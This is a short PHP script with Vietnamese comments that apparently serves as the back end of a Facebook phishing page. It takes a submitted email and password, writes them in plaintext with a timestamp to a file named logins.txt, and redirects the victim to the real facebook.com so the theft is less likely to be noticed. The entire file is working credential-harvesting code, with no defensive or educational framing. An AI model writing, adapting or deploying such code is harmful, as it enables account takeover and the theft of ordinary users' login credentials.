<?php
ob_start(); // Bắt đầu buffer để tránh lỗi header

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!empty($email) && !empty($password)) {
        $file = "logins.txt";
        $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";

        if (file_put_contents($file, $log_entry, FILE_APPEND)) {
            // echo "Lưu thông tin thành công!"; // Xóa dòng này để tránh lỗi
        }
    }

    // Điều hướng mà không có echo nào trước đó
    header("Location: https://www.facebook.com");
    exit();
}

ob_end_flush(); // Kết thúc buffer
?>
